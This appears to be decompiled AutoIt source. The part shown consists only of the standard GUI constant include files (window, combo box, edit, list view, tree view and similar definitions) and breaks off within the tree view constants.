; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: E:\bin3\New_Folder.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\GUIConstants.au3>
; ----------------------------------------------------------------------------

; Include Version:3.1.1.107  (2/04/2006)

; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    Stub file providing compatibility between the new
;						library design and the old.
;
; ------------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\GUIDefaultConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    AutoIt-GUI default control styles.
;
; ------------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\WindowsConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    Windows constants.
;
; ------------------------------------------------------------------------------

; Window Styles
Global Const $WS_TILED				= 0
Global Const $WS_OVERLAPPED 		= 0
Global Const $WS_MAXIMIZEBOX		= 0x00010000
Global Const $WS_MINIMIZEBOX		= 0x00020000
Global Const $WS_TABSTOP			= 0x00010000
Global Const $WS_GROUP				= 0x00020000
Global Const $WS_SIZEBOX			= 0x00040000
Global Const $WS_THICKFRAME			= 0x00040000
Global Const $WS_SYSMENU			= 0x00080000
Global Const $WS_HSCROLL			= 0x00100000
Global Const $WS_VSCROLL			= 0x00200000
Global Const $WS_DLGFRAME 			= 0x00400000
Global Const $WS_BORDER				= 0x00800000
Global Const $WS_CAPTION			= 0x00C00000
Global Const $WS_OVERLAPPEDWINDOW	= 0x00CF0000
Global Const $WS_TILEDWINDOW		= 0x00CF0000
Global Const $WS_MAXIMIZE			= 0x01000000
Global Const $WS_CLIPCHILDREN		= 0x02000000
Global Const $WS_CLIPSIBLINGS		= 0x04000000
Global Const $WS_DISABLED 			= 0x08000000
Global Const $WS_VISIBLE			= 0x10000000
Global Const $WS_MINIMIZE			= 0x20000000
Global Const $WS_CHILD				= 0x40000000
Global Const $WS_POPUP				= 0x80000000
Global Const $WS_POPUPWINDOW		= 0x80880000

; Dialog Styles
Global Const $DS_MODALFRAME 		= 0x80
Global Const $DS_SETFOREGROUND		= 0x00000200
Global Const $DS_CONTEXTHELP		= 0x00002000

; Window Extended Styles
Global Const $WS_EX_ACCEPTFILES			= 0x00000010
Global Const $WS_EX_MDICHILD			= 0x00000040
Global Const $WS_EX_APPWINDOW			= 0x00040000
Global Const $WS_EX_CLIENTEDGE			= 0x00000200
Global Const $WS_EX_CONTEXTHELP			= 0x00000400
Global Const $WS_EX_DLGMODALFRAME 		= 0x00000001
Global Const $WS_EX_LEFTSCROLLBAR 		= 0x00004000
Global Const $WS_EX_OVERLAPPEDWINDOW	= 0x00000300
Global Const $WS_EX_RIGHT				= 0x00001000
Global Const $WS_EX_STATICEDGE			= 0x00020000
Global Const $WS_EX_TOOLWINDOW			= 0x00000080
Global Const $WS_EX_TOPMOST				= 0x00000008
Global Const $WS_EX_TRANSPARENT			= 0x00000020
Global Const $WS_EX_WINDOWEDGE			= 0x00000100
Global Const $WS_EX_LAYERED				= 0x00080000

; Messages
Global Const $WM_SIZE = 0x05
Global Const $WM_SIZING = 0x0214
Global Const $WM_USER = 0X400
Global Const $WM_GETTEXTLENGTH = 0x000E
Global Const $WM_GETTEXT = 0x000D

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\WindowsConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\AVIConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    AVI Constants.
;
; ------------------------------------------------------------------------------

; Styles
Global Const $ACS_CENTER			= 1
Global Const $ACS_TRANSPARENT		= 2
Global Const $ACS_AUTOPLAY			= 4
Global Const $ACS_TIMER				= 8
Global Const $ACS_NONTRANSPARENT	= 16

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\AVIConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ComboConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    ComboBox constants.
;
; ------------------------------------------------------------------------------
; Combo
Global Const $CBS_SIMPLE			= 0x0001
Global Const $CBS_DROPDOWN			= 0x0002
Global Const $CBS_DROPDOWNLIST		= 0x0003
Global Const $CBS_AUTOHSCROLL		= 0x0040
Global Const $CBS_OEMCONVERT		= 0x0080
Global Const $CBS_SORT				= 0x0100
Global Const $CBS_NOINTEGRALHEIGHT	= 0x0400
Global Const $CBS_DISABLENOSCROLL	= 0x0800
Global Const $CBS_UPPERCASE			= 0x2000
Global Const $CBS_LOWERCASE			= 0x4000

; Error checking
Global Const $CB_ERR = -1
Global Const $CB_ERRATTRIBUTE = -3
Global Const $CB_ERRREQUIRED = -4
Global Const $CB_ERRSPACE = -2
Global Const $CB_OKAY = 0

; Messages to send to combobox
Global Const $CB_ADDSTRING = 0x143
Global Const $CB_DELETESTRING = 0x144
Global Const $CB_DIR = 0x145
Global Const $CB_FINDSTRING = 0x14C
Global Const $CB_FINDSTRINGEXACT = 0x158
Global Const $CB_GETCOUNT = 0x146
Global Const $CB_GETCURSEL = 0x147
Global Const $CB_GETDROPPEDCONTROLRECT = 0x152
Global Const $CB_GETDROPPEDSTATE = 0x157
Global Const $CB_GETDROPPEDWIDTH = 0X15f
Global Const $CB_GETEDITSEL = 0x140
Global Const $CB_GETEXTENDEDUI = 0x156
Global Const $CB_GETHORIZONTALEXTENT = 0x15d
Global Const $CB_GETITEMDATA = 0x150
Global Const $CB_GETITEMHEIGHT = 0x154
Global Const $CB_GETLBTEXT = 0x148
Global Const $CB_GETLBTEXTLEN = 0x149
Global Const $CB_GETLOCALE = 0x15A
Global Const $CB_GETMINVISIBLE = 0x1702
Global Const $CB_GETTOPINDEX = 0x15b
Global Const $CB_INITSTORAGE = 0x161
Global Const $CB_LIMITTEXT = 0x141
Global Const $CB_RESETCONTENT = 0x14B
Global Const $CB_INSERTSTRING = 0x14A
Global Const $CB_SELECTSTRING = 0x14D
Global Const $CB_SETCURSEL = 0x14E
Global Const $CB_SETDROPPEDWIDTH = 0x160
Global Const $CB_SETEDITSEL = 0x142
Global Const $CB_SETEXTENDEDUI = 0x155
Global Const $CB_SETHORIZONTALEXTENT = 0x15e
Global Const $CB_SETITEMDATA = 0x151
Global Const $CB_SETITEMHEIGHT = 0x153
Global Const $CB_SETLOCALE = 0x15
Global Const $CB_SETMINVISIBLE = 0x1701
Global Const $CB_SETTOPINDEX = 0x15c
Global Const $CB_SHOWDROPDOWN = 0x14F

; attributes
Global Const $CB_DDL_ARCHIVE = 0x20
Global Const $CB_DDL_DIRECTORY = 0x10
Global Const $CB_DDL_DRIVES = 0x4000
Global Const $CB_DDL_EXCLUSIVE = 0x8000
Global Const $CB_DDL_HIDDEN = 0x2
Global Const $CB_DDL_READONLY = 0x1
Global Const $CB_DDL_READWRITE = 0x0
Global Const $CB_DDL_SYSTEM = 0x4

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ComboConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\DateTimeConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    DateTime Control Constants.
;
; ------------------------------------------------------------------------------

; Date
Global Const $DTS_SHORTDATEFORMAT	= 0
Global Const $DTS_UPDOWN			= 1
Global Const $DTS_SHOWNONE			= 2
Global Const $DTS_LONGDATEFORMAT	= 4
Global Const $DTS_TIMEFORMAT		= 9
Global Const $DTS_RIGHTALIGN		= 32

; MonthCal
Global Const $MCS_NOTODAY			= 16
Global Const $MCS_NOTODAYCIRCLE		= 8
Global Const $MCS_WEEKNUMBERS		= 4

Global Const $MCM_FIRST = 0x1000
Global Const $MCM_GETCOLOR = ($MCM_FIRST + 11)
Global Const $MCM_GETFIRSTDAYOFWEEK = ($MCM_FIRST + 16)
Global Const $MCM_GETMAXSELCOUNT = ($MCM_FIRST + 3)
Global Const $MCM_GETMAXTODAYWIDTH = ($MCM_FIRST + 21)
Global Const $MCM_GETMINREQRECT = ($MCM_FIRST + 9)
Global Const $MCM_GETMONTHDELTA = ($MCM_FIRST + 19)
Global Const $MCS_MULTISELECT = 0x2
Global Const $MCM_SETCOLOR = ($MCM_FIRST + 10)
Global Const $MCM_SETFIRSTDAYOFWEEK = ($MCM_FIRST + 15)
Global Const $MCM_SETMAXSELCOUNT = ($MCM_FIRST + 4)
Global Const $MCM_SETMONTHDELTA = ($MCM_FIRST + 20)

Global Const $MCSC_BACKGROUND = 0
Global Const $MCSC_MONTHBK = 4
Global Const $MCSC_TEXT = 1
Global Const $MCSC_TITLEBK = 2
Global Const $MCSC_TITLETEXT = 3
Global Const $MCSC_TRAILINGTEXT = 5

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\DateTimeConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\EditConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    Edit Constants.
;
; ------------------------------------------------------------------------------

; Styles
Global Const $ES_LEFT				= 0
Global Const $ES_CENTER				= 1
Global Const $ES_RIGHT				= 2
Global Const $ES_MULTILINE			= 4
Global Const $ES_UPPERCASE			= 8
Global Const $ES_LOWERCASE			= 16
Global Const $ES_PASSWORD			= 32
Global Const $ES_AUTOVSCROLL		= 64
Global Const $ES_AUTOHSCROLL		= 128
Global Const $ES_NOHIDESEL			= 256
Global Const $ES_OEMCONVERT			= 1024
Global Const $ES_READONLY			= 2048
Global Const $ES_WANTRETURN			= 4096
Global Const $ES_NUMBER				= 8192
;Global Const $ES_DISABLENOSCROLL = 8192
;Global Const $ES_SUNKEN = 16384
;Global Const $ES_VERTICAL = 4194304
;Global Const $ES_SELECTIONBAR = 16777216

; Error checking
Global Const $EC_ERR = -1

; Messages to send to edit control
Global Const $ECM_FIRST = 0X1500
Global Const $EM_CANUNDO = 0xC6
Global Const $EM_EMPTYUNDOBUFFER = 0xCD
Global Const $EM_GETFIRSTVISIBLELINE = 0xCE
Global Const $EM_GETLINE = 0xC4
Global Const $EM_GETLINECOUNT = 0xBA
Global Const $EM_GETMODIFY = 0xB8
Global Const $EM_GETRECT = 0xB2
Global Const $EM_GETSEL = 0xB0
Global Const $EM_LINEFROMCHAR = 0xC9
Global Const $EM_LINEINDEX = 0xBB
Global Const $EM_LINELENGTH = 0xC1
Global Const $EM_LINESCROLL = 0xB6
Global Const $EM_REPLACESEL = 0xC2
Global Const $EM_SCROLL = 0xB5
Global Const $EM_SCROLLCARET = 0x00B7
Global Const $EM_SETMODIFY = 0xB9
Global Const $EM_SETSEL = 0xB1
Global Const $EM_UNDO = 0xC7
Global Const $EM_SETREADONLY = 0x00CF
Global Const $EM_SETTABSTOPS = 0x00CB

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\EditConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\StaticConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    Static (label, pic, icon) Constants.
;
; ------------------------------------------------------------------------------

; Label/Pic/Icon
Global Const $SS_LEFT			= 0
Global Const $SS_CENTER			= 1
Global Const $SS_RIGHT			= 2
Global Const $SS_ICON			= 3
Global Const $SS_BLACKRECT		= 4
Global Const $SS_GRAYRECT		= 5
Global Const $SS_WHITERECT		= 6
Global Const $SS_BLACKFRAME		= 7
Global Const $SS_GRAYFRAME		= 8
Global Const $SS_WHITEFRAME		= 9
Global Const $SS_SIMPLE			= 11
Global Const $SS_LEFTNOWORDWRAP	= 12
Global Const $SS_BITMAP			= 15
Global Const $SS_ETCHEDHORZ		= 16
Global Const $SS_ETCHEDVERT		= 17
Global Const $SS_ETCHEDFRAME	= 18
Global Const $SS_NOPREFIX		= 0x0080
Global Const $SS_NOTIFY			= 0x0100
Global Const $SS_CENTERIMAGE	= 0x0200
Global Const $SS_RIGHTJUST		= 0x0400
Global Const $SS_SUNKEN			= 0x1000

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\StaticConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ListBoxConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    ListBox Constants.
;
; ------------------------------------------------------------------------------

; Styles
Global Const $LBS_NOTIFY			= 0x0001
Global Const $LBS_SORT				= 0x0002
Global Const $LBS_USETABSTOPS		= 0x0080
Global Const $LBS_NOINTEGRALHEIGHT	= 0x0100
Global Const $LBS_DISABLENOSCROLL	= 0x1000
Global Const $LBS_NOSEL				= 0x4000
Global Const $LBS_STANDARD			= 0xA00003

; Errors
Global Const $LB_ERR = -1
Global Const $LB_ERRATTRIBUTE = -3
Global Const $LB_ERRREQUIRED = -4
Global Const $LB_ERRSPACE = -2

; Messages to send to listbox
Global Const $LB_ADDSTRING = 0x180
Global Const $LB_DELETESTRING = 0x182
Global Const $LB_DIR = 0x18D
Global Const $LB_FINDSTRING = 0x18F
Global Const $LB_FINDSTRINGEXACT = 0x1A2
Global Const $LB_GETANCHORINDEX = 0x019D
Global Const $LB_GETCARETINDEX = 0x019F
Global Const $LB_GETCOUNT = 0x18B
Global Const $LB_GETCURSEL = 0x188
Global Const $LB_GETHORIZONTALEXTENT = 0x193
Global Const $LB_GETITEMRECT = 0x198
Global Const $LB_GETLISTBOXINFO = 0x01B2
Global Const $LB_GETLOCALE = 0x1A6
Global Const $LB_GETSEL = 0x0187
Global Const $LB_GETSELCOUNT = 0x0190
Global Const $LB_GETSELITEMS = 0X191
Global Const $LB_GETTEXT = 0x0189
Global Const $LB_GETTEXTLEN = 0x018A
Global Const $LB_GETTOPINDEX = 0x018E
Global Const $LB_INSERTSTRING = 0x181
Global Const $LB_RESETCONTENT = 0x184
Global Const $LB_SELECTSTRING = 0x18C
Global Const $LB_SETITEMHEIGHT = 0x1A0
Global Const $LB_SELITEMRANGE = 0x19B
Global Const $LB_SELITEMRANGEEX = 0x0183
Global Const $LB_SETANCHORINDEX = 0x19C
Global Const $LB_SETCARETINDEX = 0x19E
Global Const $LB_SETCURSEL = 0x186
Global Const $LB_SETHORIZONTALEXTENT = 0x194
Global Const $LB_SETLOCALE = 0x1A5
Global Const $LB_SETSEL = 0x0185
Global Const $LB_SETTOPINDEX = 0x197

Global Const $LBS_MULTIPLESEL = 0x8

; attributes
Global Const $DDL_ARCHIVE = 0x20
Global Const $DDL_DIRECTORY = 0x10
Global Const $DDL_DRIVES = 0x4000
Global Const $DDL_EXCLUSIVE = 0x8000
Global Const $DDL_HIDDEN = 0x2
Global Const $DDL_READONLY = 0x1
Global Const $DDL_READWRITE = 0x0
Global Const $DDL_SYSTEM = 0x4

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ListBoxConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\ListViewConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.2.0
; Language:       English
; Description:    ListView Constants.
;
; ------------------------------------------------------------------------------

; Styles
Global Const $LVS_ICON	 			= 0x0000
Global Const $LVS_REPORT 			= 0x0001
Global Const $LVS_SMALLICON			= 0x0002
Global Const $LVS_LIST				= 0x0003
Global Const $LVS_EDITLABELS		= 0x0200
Global Const $LVS_NOCOLUMNHEADER	= 0x4000
Global Const $LVS_NOSORTHEADER		= 0x8000
Global Const $LVS_SINGLESEL			= 0x0004
Global Const $LVS_SHOWSELALWAYS		= 0x0008
Global Const $LVS_SORTASCENDING		= 0X0010
Global Const $LVS_SORTDESCENDING	= 0x0020
Global Const $LVS_NOLABELWRAP		= 0x0080

; listView Extended Styles
Global Const $LVS_EX_FULLROWSELECT		= 0x00000020
Global Const $LVS_EX_GRIDLINES			= 0x00000001
Global Const $LVS_EX_SUBITEMIMAGES		= 0x00000002
Global Const $LVS_EX_CHECKBOXES			= 0x00000004
Global Const $LVS_EX_TRACKSELECT		= 0x00000008
Global Const $LVS_EX_HEADERDRAGDROP		= 0x00000010
Global Const $LVS_EX_FLATSB				= 0x00000100
Global Const $LVS_EX_BORDERSELECT		= 0x00008000
;Global Const $LVS_EX_MULTIWORKAREAS		= 0x00002000
;Global Const $LVS_EX_SNAPTOGRID			= 0x00080000
;Global Const $LVS_EX_DOUBLEBUFFER		= 0x00010000
Global Const $LVS_EX_HIDELABELS = 0x20000
Global Const $LVS_EX_INFOTIP = 0x400
Global Const $LVS_EX_LABELTIP = 0x4000
Global Const $LVS_EX_ONECLICKACTIVATE = 0x40
Global Const $LVS_EX_REGIONAL = 0x200
Global Const $LVS_EX_SINGLEROW = 0x40000
Global Const $LVS_EX_TWOCLICKACTIVATE = 0x80
;~ Global Const $LVS_EX_TRACKSELECT = 0x8
Global Const $LVS_EX_UNDERLINEHOT = 0x800
Global Const $LVS_EX_UNDERLINECOLD = 0x1000

; error
Global Const $LV_ERR = -1


; Messages to send to listview
Global Const $CCM_FIRST = 0x2000
Global Const $CCM_GETUNICODEFORMAT = ($CCM_FIRST + 6)
Global Const $CCM_SETUNICODEFORMAT = ($CCM_FIRST + 5)
Global Const $CLR_NONE = 0xFFFFFFFF
Global Const $LVM_FIRST = 0x1000

Global Const $LV_VIEW_DETAILS = 0x1
Global Const $LV_VIEW_ICON = 0x0
Global Const $LV_VIEW_LIST = 0x3
Global Const $LV_VIEW_SMALLICON = 0x2
Global Const $LV_VIEW_TILE = 0x4

Global Const $LVCF_FMT = 0x1
Global Const $LVCF_WIDTH = 0x2
Global Const $LVCF_TEXT = 0x4
Global Const $LVCFMT_CENTER = 0x2
Global Const $LVCFMT_LEFT = 0x0
Global Const $LVCFMT_RIGHT = 0x1

Global Const $LVA_ALIGNLEFT = 0x1
Global Const $LVA_ALIGNTOP = 0x2
Global Const $LVA_DEFAULT = 0x0
Global Const $LVA_SNAPTOGRID = 0x5

Global Const $LVIF_STATE = 0x8
Global Const $LVIF_TEXT = 0x1

Global Const $LVFI_PARAM = 0x1
Global Const $LVFI_PARTIAL = 0x8
Global Const $LVFI_STRING = 0x2
Global Const $LVFI_WRAP = 0x20

Global Const $VK_LEFT = 0x25
Global Const $VK_RIGHT = 0x27
Global Const $VK_UP = 0x26
Global Const $VK_DOWN = 0x28
Global Const $VK_END = 0x23
Global Const $VK_PRIOR = 0x21
Global Const $VK_NEXT = 0x22

Global Const $LVIR_BOUNDS = 0

Global Const $LVIS_CUT = 0x4
Global Const $LVIS_DROPHILITED = 0x8
Global Const $LVIS_FOCUSED = 0x1
Global Const $LVIS_OVERLAYMASK = 0xF00
Global Const $LVIS_SELECTED = 0x2
Global Const $LVIS_STATEIMAGEMASK = 0xF000

Global Const $LVM_ARRANGE = ($LVM_FIRST + 22)
Global Const $LVM_CANCELEDITLABEL = ($LVM_FIRST + 179)
Global Const $LVM_DELETECOLUMN = 0x101C
Global Const $LVM_DELETEITEM = 0x1008
Global Const $LVM_DELETEALLITEMS = 0x1009
Global Const $LVM_EDITLABELA = ($LVM_FIRST + 23)
Global Const $LVM_EDITLABEL = $LVM_EDITLABELA
Global Const $LVM_ENABLEGROUPVIEW = ($LVM_FIRST + 157)
Global Const $LVM_ENSUREVISIBLE = ($LVM_FIRST + 19)
Global Const $LVM_FINDITEM = ($LVM_FIRST + 13)
Global Const $LVM_GETBKCOLOR = ($LVM_FIRST + 0)
Global Const $LVM_GETCALLBACKMASK = ($LVM_FIRST + 10)
Global Const $LVM_GETCOLUMNORDERARRAY = ($LVM_FIRST + 59)
Global Const $LVM_GETCOLUMNWIDTH = ($LVM_FIRST + 29)
Global Const $LVM_GETCOUNTPERPAGE = ($LVM_FIRST + 40)
Global Const $LVM_GETEDITCONTROL = ($LVM_FIRST + 24)
Global Const $LVM_GETEXTENDEDLISTVIEWSTYLE = ($LVM_FIRST + 55)
Global Const $LVM_GETHEADER = ($LVM_FIRST + 31)
Global Const $LVM_GETHOTCURSOR = ($LVM_FIRST + 63)
Global Const $LVM_GETHOTITEM = ($LVM_FIRST + 61)
Global Const $LVM_GETHOVERTIME = ($LVM_FIRST + 72)
Global Const $LVM_GETIMAGELIST = ($LVM_FIRST + 2)
Global Const $LVM_GETITEMA = ($LVM_FIRST + 5)
Global Const $LVM_GETITEMCOUNT = 0x1004
Global Const $LVM_GETITEMSTATE = ($LVM_FIRST + 44)
Global Const $LVM_GETITEMTEXTA = ($LVM_FIRST + 45);
Global Const $LVM_GETNEXTITEM = 0x100c
Global Const $LVM_GETSELECTEDCOLUMN = ($LVM_FIRST + 174)
Global Const $LVM_GETSELECTEDCOUNT = ($LVM_FIRST + 50)
Global Const $LVM_GETSUBITEMRECT = ($LVM_FIRST + 56);
Global Const $LVM_GETTOPINDEX = ($LVM_FIRST + 39)
Global Const $LVM_GETUNICODEFORMAT = $CCM_GETUNICODEFORMAT
Global Const $LVM_GETVIEW = ($LVM_FIRST + 143)
Global Const $LVM_GETVIEWRECT = ($LVM_FIRST + 34)
Global Const $LVM_INSERTCOLUMNA = ($LVM_FIRST + 27)
Global Const $LVM_INSERTITEMA = ($LVM_FIRST + 7)
Global Const $LVM_REDRAWITEMS = ($LVM_FIRST + 21)
Global Const $LVM_SETUNICODEFORMAT = $CCM_SETUNICODEFORMAT
Global Const $LVM_SCROLL = ($LVM_FIRST + 20)
Global Const $LVM_SETBKCOLOR = 0x1001
Global Const $LVM_SETCALLBACKMASK = ($LVM_FIRST + 11)
Global Const $LVM_SETCOLUMNA = ($LVM_FIRST + 26)
Global Const $LVM_SETCOLUMNORDERARRAY = ($LVM_FIRST + 58)
Global Const $LVM_SETCOLUMNWIDTH = 0x101E
Global Const $LVM_SETEXTENDEDLISTVIEWSTYLE = 0x1036
Global Const $LVM_SETHOTITEM = ($LVM_FIRST + 60)
Global Const $LVM_SETHOVERTIME = ($LVM_FIRST + 71)
Global Const $LVM_SETICONSPACING = ($LVM_FIRST + 53)
Global Const $LVM_SETITEMCOUNT = ($LVM_FIRST + 47)
Global Const $LVM_SETITEMPOSITION = ($LVM_FIRST + 15)
Global Const $LVM_SETITEMSTATE = ($LVM_FIRST + 43)
Global Const $LVM_SETITEMTEXTA = ($LVM_FIRST + 46)
Global Const $LVM_SETSELECTEDCOLUMN = ($LVM_FIRST + 140)
Global Const $LVM_SETTEXTCOLOR = ($LVM_FIRST + 36)
Global Const $LVM_SETTEXTBKCOLOR = ($LVM_FIRST + 38)
Global Const $LVM_SETVIEW = ($LVM_FIRST + 142)
Global Const $LVM_UPDATE = ($LVM_FIRST + 42)

Global Const $LVNI_ABOVE = 0x100
Global Const $LVNI_BELOW = 0x200
Global Const $LVNI_TOLEFT = 0x400
Global Const $LVNI_TORIGHT = 0x800
Global Const $LVNI_ALL = 0x0
Global Const $LVNI_CUT = 0x4
Global Const $LVNI_DROPHILITED = 0x8
Global Const $LVNI_FOCUSED = 0x1
Global Const $LVNI_SELECTED = 0x2

Global Const $LVSCW_AUTOSIZE = -1
Global Const $LVSCW_AUTOSIZE_USEHEADER = -2

Global Const $LVSICF_NOINVALIDATEALL = 0x1
Global Const $LVSICF_NOSCROLL = 0x2

Global Const $LVSIL_NORMAL = 0
Global Const $LVSIL_SMALL = 1
Global Const $LVSIL_STATE = 2

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\ListViewConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\SliderConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    Slider Constants
;
; ------------------------------------------------------------------------------

; Styles
Global Const $TBS_AUTOTICKS	= 0x0001
Global Const $TBS_VERT		= 0x0002
Global Const $TBS_HORZ		= 0x0000
Global Const $TBS_TOP		= 0x0004
Global Const $TBS_BOTTOM	= 0x0000
Global Const $TBS_LEFT		= 0x0004
Global Const $TBS_RIGHT		= 0x0000
Global Const $TBS_BOTH		= 0x0008
Global Const $TBS_NOTICKS	= 0x0010
Global Const $TBS_NOTHUMB	= 0x0080

; Messages
Global Const $TWM_USER = 0x400	; WM_USER
Global Const $TBM_CLEARTICS = ($TWM_USER + 9)
Global Const $TBM_GETLINESIZE = ($TWM_USER + 24)
Global Const $TBM_GETPAGESIZE = ($TWM_USER + 22)
Global Const $TBM_GETNUMTICS = ($TWM_USER + 16)
Global Const $TBM_GETPOS = $TWM_USER
Global Const $TBM_GETRANGEMAX = ($TWM_USER + 2)
Global Const $TBM_GETRANGEMIN = ($TWM_USER + 1)
Global Const $TBM_SETLINESIZE = ($TWM_USER + 23)
Global Const $TBM_SETPAGESIZE = ($TWM_USER + 21)
Global Const $TBM_SETPOS = ($TWM_USER + 5)
Global Const $TBM_SETTICFREQ = ($TWM_USER + 20)

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\SliderConstants.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\TreeViewConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1 (beta)
; Language:       English
; Description:    TreeView Constants.
;
; ------------------------------------------------------------------------------

; Styles
Global Const $TVS_HASBUTTONS     	= 0x0001
Global Const $TVS_HASLINES       	= 0x0002
Global Const $TVS_LINESATROOT    	= 0x0004
;Global Const $TVS_EDITLABELS      = 0x0008
Global Const $TVS_DISABLEDRAGDROP	= 0x0010
Global Const $TVS_SHOWSELALWAYS		= 0x0020
;Global Const $TVS_RTLREADING     = 0x0040
Global Const $TVS_NOTOOLTIPS		= 0x0080
Global Const $TVS_CHECKBOXES		= 0x0100
Global Const $TVS_TRACKSELECT		= 0x0200
Global Const $TVS_SINGLEEXPAND		= 0x0400
;Global Const $TVS_INFOTIP        = 0x0800
Global Const $TVS_FULLROWSELECT		= 0x1000
Global Const $TVS_NOSCROLL			= 0x2000
Global Const $TVS_NONEVENHEIGHT		= 0x4000

Global Const $TVE_COLLAPSE			= 0x0001
Global Const $TVE_EXPAND			= 0x0002
Global Const $TVE_TOGGLE			= 0x0003
Global Const $TVE_EXPANDPARTIAL		= 0x4000
Global Const $TVE_COLLAPSERESET = 0x8000

Global Const $TVGN_ROOT				= 0x0000
Global Const $TVGN_NEXT				= 0x0001
Global Const $TVGN_PARENT			= 0x0003
Global Const $TVGN_CHILD			= 0x0004
Global Const $TVGN_CARET			= 0x0009

Global Const $TVI_ROOT				= 0xFFFF0000
Global Const $TVI_FIRST				= 0xFFFF0001
Global Const $TVI_LAST				= 0xFFFF0002
Global Const $TVI_SORT				= 0xFFFF0003

Global Const $TVIF_TEXT = 0x0001
Global Const $TVIF_IMAGE			= 0x0002
Global Const $TVIF_PARAM			= 0x0004
Global Const $TVIF_STATE			= 0x0008
Global Const $TVIF_HANDLE			= 0x0010
Global Const $TVIF_SELECTEDIMAGE	= 0x0020
Global Const $TVIF_CHILDREN			= 0x0040

Global Const $TVIS_SELECTED			= 0x0002
Global Const $TVIS_CUT				= 0x0004
Global Const $TVIS_DROPHILITED		= 0x0008
Global Const $TVIS_BOLD				= 0x0010
Global Const $TVIS_EXPANDED			= 0x0020
Global Const $TVIS_EXPANDEDONCE		= 0x0040
Global Const $TVIS_EXPANDPARTIAL	= 0x0080
Global Const $TVIS_OVERLAYMASK		= 0x0F00
Global Const $TVIS_STATEIMAGEMASK = 0xF000

; Messages to send to TreeView
Global Const $TV_FIRST				= 0x1100
Global Const $TVM_INSERTITEM		= $TV_FIRST + 0
Global Const $TVM_DELETEITEM		= $TV_FIRST + 1
Global Const $TVM_EXPAND			= $TV_FIRST + 2
Global Const $TVM_GETCOUNT			= $TV_FIRST + 5
Global Const $TVM_GETINDENT			= $TV_FIRST + 6
Global Const $TVM_SETINDENT			= $TV_FIRST + 7
Global Const $TVM_GETIMAGELIST		= $TV_FIRST + 8
Global Const $TVM_SETIMAGELIST		= $TV_FIRST + 9
Global Const $TVM_GETNEXTITEM		= $TV_FIRST + 10
Global Const $TVM_SELECTITEM		= $TV_FIRST + 11
Global Const $TVM_GETITEM			= $TV_FIRST + 12
Global Const $TVM_SETITEM			= $TV_FIRST + 13
